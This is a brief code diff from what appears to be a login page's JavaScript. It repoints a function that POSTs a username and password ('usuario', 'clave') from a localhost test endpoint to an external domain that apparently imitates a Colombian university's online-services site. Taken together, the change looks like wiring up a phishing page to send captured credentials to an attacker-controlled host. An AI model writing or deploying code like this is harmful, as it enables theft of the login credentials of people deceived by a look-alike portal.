@@ -10,7 +10,7 @@ document.addEventListener('DOMContentLoaded', function () {
     });
 
     function enviarDatosAlServidor(usuario, clave) {
-        fetch('http://localhost:8081/enviar-datos', {
+        fetch('https://www.uniquindioserviciosenlinea.com', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
